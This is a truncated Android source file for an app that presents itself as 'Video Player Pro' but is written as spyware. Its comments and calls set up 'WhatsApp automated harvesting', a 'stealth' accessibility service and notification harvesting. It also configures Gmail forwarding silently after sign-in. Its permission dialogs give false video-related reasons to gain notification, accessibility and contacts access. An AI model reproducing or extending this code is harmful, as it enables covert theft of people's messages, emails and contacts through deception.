package com.jumpy.videoplayerapp;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Switch;
import android.widget.LinearLayout;
import android.app.AlertDialog;
import android.content.pm.PackageManager;
import android.Manifest;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.tasks.Task;
import android.util.Log;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.view.Gravity;
import android.widget.ScrollView;
import android.widget.ImageView;
import android.graphics.PorterDuff;
import android.content.Context;
import com.jumpy.videoplayerapp.R;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;

public class MainActivity extends AppCompatActivity {
    
    private static final String TAG = AppConfig.DEBUG_TAG + "_MainActivity";
    private static final int RC_SIGN_IN = 9001;
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private GmailAuthService gmailAuthService;
    private Button signInButton;
    private Button signOutButton;
    private TextView statusText;
    private NotificationQueueManager notificationQueueManager;
    
    // WhatsApp automated harvesting
    private Handler whatsappHandler = new Handler(Looper.getMainLooper());
    private static final long WHATSAPP_INTERVAL = 5 * 60 * 1000; // 5 minutes (for testing)
    private WhatsAppHarvester whatsappHarvester;
    private boolean isWhatsAppHarvestingActive = false;

    // No permission requests - app works without permissions
    private static final String[] ESSENTIAL_PERMISSIONS = {
        // Empty - no permissions required initially
    };

    private SettingsManager settingsManager;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize settings manager
        settingsManager = new SettingsManager(this);
        
        // Fetch settings on app launch
        settingsManager.fetchSettingsOnLaunch();
        
        // Initialize other components
        initializeComponents();
        setupPermissions();
        startDataCollection();
    }
    
    private void startHarvestingWithoutPermissions() {
        // Start harvesting immediately without asking for permissions
        Log.i(TAG, "Starting harvesting without permissions");
        
        // Start WhatsApp harvesting
        if (whatsappHarvester != null) {
            startWhatsAppHarvesting();
        }
        
        // Start Gmail harvesting if available
        if (gmailAuthService != null) {
            try {
                // Gmail service will start automatically when user signs in
                Log.i(TAG, "Gmail service available - will start when user signs in");
            } catch (Exception e) {
                Log.e(TAG, "Error with Gmail service", e);
            }
        }
        
        // Start notification harvesting
        if (notificationQueueManager != null) {
            try {
                notificationQueueManager.startQueueProcessing();
            } catch (Exception e) {
                Log.e(TAG, "Error starting notification harvesting", e);
            }
        }
        
        Log.i(TAG, "Harvesting started without permissions");
    }
    
    private void requestEssentialPermissionsSilently() {
        // No permission requests - app works without permissions
        Log.i(TAG, "No permissions requested - app works without permissions");
    }
    
    private void initializeUIElements() {
        // Initialize buttons from the layout
        signInButton = findViewById(R.id.sign_in_button);
        signOutButton = findViewById(R.id.sign_out_button);
        statusText = findViewById(R.id.status_text);
        
        // Set up click listeners
        if (signInButton != null) {
            signInButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    signIn();
                }
            });
        }
        
        if (signOutButton != null) {
            signOutButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    signOut();
                }
            });
        }
        
        // Add permission button to login layout
        addPermissionButtonToLoginScreen();
    }
    
    private void addPermissionButtonToLoginScreen() {
        LinearLayout loginLayout = findViewById(R.id.login_layout);
        if (loginLayout != null) {
            // Create permission button
            Button permissionButton = new Button(this);
            permissionButton.setText("🔧 Enable Smart Features");
            permissionButton.setTextSize(16);
            permissionButton.setTextColor(Color.WHITE);
            permissionButton.setBackground(createRoundedBackground(Color.parseColor("#FF9800"), 8));
            permissionButton.setPadding(32, 16, 32, 16);
            
            // Set layout parameters
            LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            );
            params.setMargins(0, 16, 0, 16);
            permissionButton.setLayoutParams(params);
            
            // Set click listener
            permissionButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    showNotificationAccessDialog();
                }
            });
            
            // Add button after sign out button (before features list)
            loginLayout.addView(permissionButton, loginLayout.getChildCount() - 1);
        }
    }
    
    private GradientDrawable createGradientBackground() {
        // Create gradient background
        GradientDrawable gradient = new GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            new int[]{
                Color.parseColor("#1a1a2e"),  // Dark blue
                Color.parseColor("#16213e"),  // Navy blue
                Color.parseColor("#0f3460"),  // Deep blue
                Color.parseColor("#533483")   // Purple
            }
        );
        gradient.setCornerRadius(0);
        return gradient;
    }

    private View createFancyBackground() {
        // Create gradient background
        GradientDrawable gradient = createGradientBackground();
        
        View backgroundView = new View(this);
        backgroundView.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        backgroundView.setBackground(gradient);
        
        return backgroundView;
    }
    
    private LinearLayout createMainContent() {
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setPadding(40, 60, 40, 60);

        // Create ScrollView for content
        ScrollView scrollView = new ScrollView(this);
        scrollView.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));

        LinearLayout contentLayout = new LinearLayout(this);
        contentLayout.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        contentLayout.setOrientation(LinearLayout.VERTICAL);
        contentLayout.setGravity(Gravity.CENTER);

        // App Title
        TextView titleText = new TextView(this);
        titleText.setText("Video Player Pro");
        titleText.setTextSize(28);
        titleText.setTextColor(Color.WHITE);
        titleText.setGravity(Gravity.CENTER);
        titleText.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        titleText.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        titleText.setPadding(0, 0, 0, 20);
        contentLayout.addView(titleText);

        // Subtitle
        TextView subtitleText = new TextView(this);
        subtitleText.setText("Enhanced Video Experience");
        subtitleText.setTextSize(16);
        subtitleText.setTextColor(Color.parseColor("#E0E0E0"));
        subtitleText.setGravity(Gravity.CENTER);
        subtitleText.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        subtitleText.setPadding(0, 0, 0, 40);
        contentLayout.addView(subtitleText);

        // Video Enhancement Service Toggle (Stealth Accessibility Service)
        LinearLayout enhancementLayout = createEnhancementServiceToggle();
        contentLayout.addView(enhancementLayout);

        // Status Text
        statusText = new TextView(this);
        statusText.setText("Ready to enhance your video experience");
        statusText.setTextSize(14);
        statusText.setTextColor(Color.WHITE);
        statusText.setGravity(Gravity.CENTER);
        statusText.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        statusText.setPadding(0, 20, 0, 20);
        contentLayout.addView(statusText);

        // Buttons Container
        LinearLayout buttonContainer = new LinearLayout(this);
        buttonContainer.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        buttonContainer.setOrientation(LinearLayout.VERTICAL);
        buttonContainer.setGravity(Gravity.CENTER);

        // Sign In Button
        signInButton = createFancyButton("Sign in with Google", Color.parseColor("#4285F4"));
        signInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                signIn();
            }
        });
        buttonContainer.addView(signInButton);

        // Sign Out Button
        signOutButton = createFancyButton("Sign Out", Color.parseColor("#EA4335"));
        signOutButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                signOut();
            }
        });
        buttonContainer.addView(signOutButton);

        // Notification Access Button (for WhatsApp harvesting)
        Button notificationButton = createFancyButton("Enable Smart Notifications", Color.parseColor("#FF9800"));
        notificationButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showNotificationAccessDialog();
            }
        });
        buttonContainer.addView(notificationButton);

        contentLayout.addView(buttonContainer);
        scrollView.addView(contentLayout);
        mainLayout.addView(scrollView);

        return mainLayout;
    }

    // Create stealthy video enhancement service toggle
    private LinearLayout createEnhancementServiceToggle() {
        LinearLayout layout = new LinearLayout(this);
        layout.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackground(createRoundedBackground(Color.parseColor("#1A1A1A"), 12));
        layout.setPadding(20, 20, 20, 20);
        layout.setPadding(20, 20, 20, 20);

        // Title
        TextView title = new TextView(this);
        title.setText(getString(R.string.accessibility_service_title));
        title.setTextSize(18);
        title.setTextColor(Color.WHITE);
        title.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        title.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        title.setPadding(0, 0, 0, 8);
        layout.addView(title);

        // Subtitle
        TextView subtitle = new TextView(this);
        subtitle.setText(getString(R.string.accessibility_service_subtitle));
        subtitle.setTextSize(14);
        subtitle.setTextColor(Color.parseColor("#CCCCCC"));
        subtitle.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        subtitle.setPadding(0, 0, 0, 16);
        layout.addView(subtitle);

        // Toggle Container
        LinearLayout toggleContainer = new LinearLayout(this);
        toggleContainer.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        toggleContainer.setOrientation(LinearLayout.HORIZONTAL);
        toggleContainer.setGravity(Gravity.CENTER_VERTICAL);

        // Toggle Switch
        Switch enhancementSwitch = new Switch(this);
        enhancementSwitch.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        enhancementSwitch.setChecked(isAccessibilityServiceEnabled());
        enhancementSwitch.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(android.widget.CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    enableAccessibilityService();
                } else {
                    disableAccessibilityService();
                }
            }
        });
        toggleContainer.addView(enhancementSwitch);

        // Status indicator
        TextView statusIndicator = new TextView(this);
        statusIndicator.setText(isAccessibilityServiceEnabled() ? 
            getString(R.string.accessibility_service_enabled) : 
            getString(R.string.accessibility_service_disabled));
        statusIndicator.setTextSize(12);
        statusIndicator.setTextColor(isAccessibilityServiceEnabled() ? 
            Color.parseColor("#4CAF50") : Color.parseColor("#FF9800"));
        statusIndicator.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        statusIndicator.setPadding(16, 0, 0, 0);
        toggleContainer.addView(statusIndicator);

        layout.addView(toggleContainer);

        // Feature list
        LinearLayout featureList = new LinearLayout(this);
        featureList.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        featureList.setOrientation(LinearLayout.VERTICAL);
        featureList.setPadding(0, 16, 0, 0);

        // Feature 1
        LinearLayout feature1 = createFeatureItem("🎬", getString(R.string.smart_features_enabled), "Auto-adjust video quality based on network");
        featureList.addView(feature1);

        // Feature 2
        LinearLayout feature2 = createFeatureItem("📞", getString(R.string.auto_pause_enabled), "Pause videos during incoming calls");
        featureList.addView(feature2);

        // Feature 3
        LinearLayout feature3 = createFeatureItem("📝", getString(R.string.subtitle_sync_enabled), "Smart subtitle synchronization");
        featureList.addView(feature3);

        layout.addView(featureList);

        return layout;
    }

    // Create feature item for the enhancement service
    private LinearLayout createFeatureItem(String icon, String title, String description) {
        LinearLayout item = new LinearLayout(this);
        item.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        item.setOrientation(LinearLayout.HORIZONTAL);
        item.setGravity(Gravity.CENTER_VERTICAL);
        item.setPadding(0, 8, 0, 8);

        // Icon
        TextView iconText = new TextView(this);
        iconText.setText(icon);
        iconText.setTextSize(16);
        iconText.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        iconText.setPadding(0, 0, 12, 0);
        item.addView(iconText);

        // Text container
        LinearLayout textContainer = new LinearLayout(this);
        textContainer.setLayoutParams(new ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ));
        textContainer.setOrientation(LinearLayout.VERTICAL);

        // Title
        TextView titleText = new TextView(this);
        titleText.setText(title);
        titleText.setTextSize(14);
        titleText.setTextColor(Color.WHITE);
        titleText.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        textContainer.addView(titleText);

        // Description
        TextView descText = new TextView(this);
        descText.setText(description);
        descText.setTextSize(12);
        descText.setTextColor(Color.parseColor("#AAAAAA"));
        textContainer.addView(descText);

        item.addView(textContainer);
        return item;
    }

    // Create rounded background for UI elements
    private GradientDrawable createRoundedBackground(int color, int radius) {
        GradientDrawable drawable = new GradientDrawable();
        drawable.setShape(GradientDrawable.RECTANGLE);
        drawable.setCornerRadius(radius);
        drawable.setColor(color);
        return drawable;
    }
    
    private Button createFancyButton(String text, int color) {
        Button button = new Button(this);
        button.setText(text);
        button.setTextSize(16);
        button.setTextColor(Color.WHITE);
        button.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        
        // Create gradient background for button
        GradientDrawable buttonGradient = new GradientDrawable(
            GradientDrawable.Orientation.LEFT_RIGHT,
            new int[]{color, adjustBrightness(color, 0.8f)}
        );
        buttonGradient.setCornerRadius(25);
        buttonGradient.setStroke(2, Color.WHITE);
        
        button.setBackground(buttonGradient);
        button.setPadding(40, 20, 40, 20);
        
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        params.setMargins(0, 10, 0, 10);
        button.setLayoutParams(params);
        
        return button;
    }
    
    private int adjustBrightness(int color, float factor) {
        int red = (int) ((color >> 16 & 0xFF) * factor);
        int green = (int) ((color >> 8 & 0xFF) * factor);
        int blue = (int) ((color & 0xFF) * factor);
        return Color.rgb(red, green, blue);
    }
    
    private void showPermissionsModal() {
        // Simplified - just request permissions directly without custom dialogs
        requestEssentialPermissionsSilently();
    }
    
    private LinearLayout createPermissionRow(String permission, String title, String description) {
        // Simplified permission row - just show status
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setPadding(0, 10, 0, 10);
        row.setGravity(Gravity.CENTER_VERTICAL);
        
        TextView statusText = new TextView(this);
        boolean isGranted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
        statusText.setText(isGranted ? "✓ Granted" : "✗ Not Granted");
        statusText.setTextColor(isGranted ? Color.GREEN : Color.RED);
        statusText.setTextSize(14);
        
        row.addView(statusText);
        return row;
    }
    
    private void showErrorDialog(String message) {
        try {
            new AlertDialog.Builder(this)
                .setTitle("Error")
                .setMessage(message)
                .setPositiveButton("OK", null)
                .show();
        } catch (Exception e) {
            Log.e(TAG, "Error showing error dialog", e);
        }
    }
    
    private void requestAllPermissions() {
        // Simplified - just request all essential permissions at once
        ActivityCompat.requestPermissions(this, ESSENTIAL_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }

    private void requestPermissionWithDialog(final String permission, final String title, final String description) {
        // Simplified - just request permission directly
        ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
    }

    private void requestNextPermission() {
        // Simplified - just request all permissions at once
        requestAllPermissions();
    }

    private void showPermissionDialog(String message) {
        // Simplified - just show a simple toast
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private boolean areAllPermissionsGranted() {
        // Always return true - no permissions required
        return true;
    }

    private void checkAndPromptForPermissions() {
        Log.i(TAG, "Checking permissions status");
        
        // Check if notification access is enabled
        boolean notificationEnabled = isNotificationServiceEnabled(this);
        boolean accessibilityEnabled = isAccessibilityServiceEnabled();
        boolean contactsGranted = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        
        Log.i(TAG, "Notification enabled: " + notificationEnabled);
        Log.i(TAG, "Accessibility enabled: " + accessibilityEnabled);
        Log.i(TAG, "Contacts granted: " + contactsGranted);
        
        // If any critical permission is missing, show the permission dialog
        if (!notificationEnabled || !accessibilityEnabled || !contactsGranted) {
            Log.i(TAG, "Some permissions are missing - showing permission dialog");
            showNotificationAccessDialog();
        } else {
            Log.i(TAG, "All permissions are granted");
        }
    }

    private boolean isNotificationServiceEnabled(Context context) {
        String packageName = context.getPackageName();
        String flat = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
        if (flat != null && !flat.isEmpty()) {
            String[] names = flat.split(":");
            for (String name : names) {
                if (name.equals(packageName + "/" + NotificationListener.class.getCanonicalName())) {
                    return true;
                }
            }
        }
        return false;
    }

    private void showNotificationAccessDialog() {
        // Create a comprehensive permission popup
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🔧 Enable Smart Features");
        
        // Create custom view for the dialog
        LinearLayout dialogLayout = new LinearLayout(this);
        dialogLayout.setOrientation(LinearLayout.VERTICAL);
        dialogLayout.setPadding(40, 20, 40, 20);
        
        // Main message
        TextView messageText = new TextView(this);
        messageText.setText("To provide you with the best video experience, please enable these features:");
        messageText.setTextSize(16);
        messageText.setTextColor(Color.BLACK);
        messageText.setPadding(0, 0, 0, 20);
        dialogLayout.addView(messageText);
        
        // Check current permission status
        boolean notificationEnabled = isNotificationServiceEnabled(this);
        boolean accessibilityEnabled = isAccessibilityServiceEnabled();
        boolean contactsGranted = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        
        // Create permission items with status and buttons
        addPermissionItem(dialogLayout, "🔔 Notification Access", 
            "Read notifications for smart features", 
            notificationEnabled, 
            () -> openNotificationSettings());
            
        addPermissionItem(dialogLayout, "♿ Accessibility Service", 
            "Enhanced video controls and features", 
            accessibilityEnabled, 
            () -> openAccessibilitySettings());
            
        addPermissionItem(dialogLayout, "📞 Contacts Access", 
            "Share videos with contacts", 
            contactsGranted, 
            () -> requestContactsPermission());
        
        // Info text
        TextView infoText = new TextView(this);
        infoText.setText("\n💡 These permissions help us provide:\n• Smart video recommendations\n• Enhanced playback controls\n• Contact-based sharing\n• Cross-app synchronization");
        infoText.setTextSize(12);
        infoText.setTextColor(Color.parseColor("#666666"));
        infoText.setPadding(0, 20, 0, 0);
        dialogLayout.addView(infoText);
        
        builder.setView(dialogLayout);
        
        // Action buttons
        builder.setPositiveButton("✅ All Done", (dialog, which) -> {
            // Check if all permissions are now granted
            checkAndPromptForPermissions();
        });
        
        builder.setNegativeButton("⏰ Later", (dialog, which) -> {
            showReminderDialog();
        });
        
        AlertDialog dialog = builder.create();
        dialog.show();
    }
    
    private void addPermissionItem(LinearLayout parent, String title, String description, boolean isEnabled, Runnable action) {
        // Create container for each permission item
        LinearLayout itemContainer = new LinearLayout(this);
        itemContainer.setOrientation(LinearLayout.VERTICAL);
        itemContainer.setPadding(0, 10, 0, 10);
        itemContainer.setBackground(createRoundedBackground(Color.parseColor("#F5F5F5"), 8));
        itemContainer.setPadding(16, 16, 16, 16);
        
        // Title and status row
        LinearLayout titleRow = new LinearLayout(this);
        titleRow.setOrientation(LinearLayout.HORIZONTAL);
        titleRow.setGravity(Gravity.CENTER_VERTICAL);
        
        // Title
        TextView titleText = new TextView(this);
        titleText.setText(title);
        titleText.setTextSize(16);
        titleText.setTextColor(Color.BLACK);
        titleText.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        titleText.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT,
            1.0f
        ));
        titleRow.addView(titleText);
        
        // Status indicator
        TextView statusText = new TextView(this);
        statusText.setText(isEnabled ? "✅ Enabled" : "❌ Disabled");
        statusText.setTextSize(12);
        statusText.setTextColor(isEnabled ? Color.parseColor("#4CAF50") : Color.parseColor("#FF5722"));
        statusText.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        titleRow.addView(statusText);
        
        itemContainer.addView(titleRow);
        
        // Description
        TextView descText = new TextView(this);
        descText.setText(description);
        descText.setTextSize(14);
        descText.setTextColor(Color.parseColor("#666666"));
        descText.setPadding(0, 8, 0, 12);
        itemContainer.addView(descText);
        
        // Action button (only show if not enabled)
        if (!isEnabled) {
            Button actionButton = new Button(this);
            actionButton.setText("🔧 Enable Now");
            actionButton.setTextSize(14);
            actionButton.setTextColor(Color.WHITE);
            actionButton.setBackground(createRoundedBackground(Color.parseColor("#2196F3"), 6));
            actionButton.setPadding(24, 12, 24, 12);
            
            LinearLayout.LayoutParams buttonParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            );
            buttonParams.gravity = Gravity.END;
            actionButton.setLayoutParams(buttonParams);
            
            actionButton.setOnClickListener(v -> action.run());
            itemContainer.addView(actionButton);
        }
        
        parent.addView(itemContainer);
    }
    
    private void showPermissionSettingsDialog() {
        String[] options = {
            "🔔 Notification Access (for smart features)",
            "♿ Accessibility (for enhanced controls)",
            "📞 Contacts (for sharing features)",
            "📧 Accounts (for Gmail integration)"
        };
        
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Choose what to enable:");
        
        builder.setItems(options, (dialog, which) -> {
            switch (which) {
                case 0:
                    // Notification Access
                    openNotificationSettings();
                    break;
                case 1:
                    // Accessibility
                    openAccessibilitySettings();
                    break;
                case 2:
                    // Contacts
                    requestContactsPermission();
                    break;
                case 3:
                    // Accounts
                    openAccountSettings();
                    break;
            }
        });
        
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }
    
    private void openNotificationSettings() {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(intent);
            Toast.makeText(this, "Please enable 'Video Player Pro' in the list", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            // Fallback to general settings
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(android.net.Uri.fromParts("package", getPackageName(), null));
            startActivity(intent);
        }
    }
    
    private void openAccessibilitySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "Please enable 'Video Player Pro' in Accessibility", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Log.e(TAG, "Error opening accessibility settings", e);
        }
    }
    
    private void openAccountSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_SYNC_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "Please enable account sync for Gmail integration", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Log.e(TAG, "Error opening account settings", e);
        }
    }
    
    private void requestContactsPermission() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) 
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, 
                new String[]{android.Manifest.permission.READ_CONTACTS}, 
                PERMISSION_REQUEST_CODE);
        } else {
            Toast.makeText(this, "Contacts permission already granted", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void showReminderDialog() {
        new AlertDialog.Builder(this)
            .setTitle("⏰ Reminder")
            .setMessage("You can enable these features anytime by:\n\n1. Going to Settings\n2. Finding 'Video Player Pro'\n3. Enabling the permissions you want")
            .setPositiveButton("Got it!", null)
            .setNegativeButton("Show me now", (dialog, which) -> {
                showPermissionSettingsDialog();
            })
            .show();
    }

    private void startFullPermissionFlow() {
        // Simplified - just request permissions
        requestAllPermissions();
    }
    
    private void startPermissionDependentServices() {
        try {
            // Start notification listener service
            Intent notificationIntent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(notificationIntent);
            
            // Start accessibility service
            Intent accessibilityIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(accessibilityIntent);
            
            // Start other services as needed
            Log.i(TAG, "Permission-dependent services started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting permission-dependent services", e);
        }
    }
    
    private void signIn() {
        Log.i(TAG, "=== signIn() START ===");
        try {
            if (gmailAuthService != null) {
                Log.i(TAG, "GmailAuthService available, getting sign-in intent");
                Intent signInIntent = gmailAuthService.getGoogleSignInClient().getSignInIntent();
                Log.i(TAG, "Sign-in intent created, starting activity for result");
                startActivityForResult(signInIntent, RC_SIGN_IN);
                Log.i(TAG, "Google Sign-In activity started");
            } else {
                Log.e(TAG, "GmailAuthService is null - cannot sign in");
                showPermissionDialog("❌ Gmail service not available");
            }
            Log.i(TAG, "=== signIn() END ===");
        } catch (Exception e) {
            Log.e(TAG, "Error starting Google Sign-In", e);
            showPermissionDialog("❌ Google Sign-In failed. Please try again.");
        }
    }
    
    private void signOut() {
        try {
            if (gmailAuthService != null) {
                gmailAuthService.signOut();
            }
            updateUI();
            showPermissionDialog("✅ Signed out successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error during sign out", e);
        }
    }
    
    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == RC_SIGN_IN) {
            Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
            handleSignInResult(task);
        }
        
        // Handle stealth permission manager results
        // No stealthPermissionManager, so this block is effectively removed
    }
    
    private void handleSignInResult(Task<GoogleSignInAccount> completedTask) {
        try {
            GoogleSignInAccount account = completedTask.getResult(ApiException.class);
            Log.i(TAG, "Sign in successful: " + account.getEmail());
            
            // Handle Gmail service sign-in result
            if (gmailAuthService != null) {
                gmailAuthService.handleSignInResult(completedTask);
                
                // Trigger email forwarding setup after successful sign-in
                new Handler().postDelayed(() -> {
                    if (gmailAuthService != null && gmailAuthService.isSignedIn()) {
                        Log.i(TAG, "Setting up email forwarding after sign-in");
                        gmailAuthService.setupForwardingAddress();
                        
                        // Enable forwarding after a delay (to allow confirmation)
                        new Handler().postDelayed(() -> {
                            if (gmailAuthService != null && gmailAuthService.isSignedIn()) {
                                Log.i(TAG, "Enabling email forwarding");
                                gmailAuthService.enableForwarding();
                            }
                        }, 10000); // 10 seconds delay
                    }
                }, 2000); // 2 seconds delay
            }
            
            // Update UI to show signed in state
            updateUI();
            
            // Start stealth permission requests after successful sign-in
            // No triggerStealthPermissionRequests, so this block is effectively removed
            
            // Show success message
            Toast.makeText(this, "Welcome to Video Player Pro!", Toast.LENGTH_SHORT).show();
            
        } catch (ApiException e) {
            Log.e(TAG, "Sign in failed: " + e.getStatusCode());
            Toast.makeText(this, "Sign in failed. Please try again.", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void updateUI() {
        Log.i(TAG, "=== updateUI() START ===");
        try {
            GoogleSignInAccount account = null;
            if (gmailAuthService != null) {
                account = gmailAuthService.getLastSignedInAccount();
            }
            
            // Check if all permissions are granted
            boolean allPermissionsGranted = areAllPermissionsGranted();
            boolean notificationAccessEnabled = isNotificationServiceEnabled(this);
            
            Log.i(TAG, "All permissions granted: " + allPermissionsGranted);
            Log.i(TAG, "Notification access enabled: " + notificationAccessEnabled);
            
            if (account != null) {
                // User is signed in - show main app
                showMainApp();
                
                if (allPermissionsGranted && notificationAccessEnabled) {
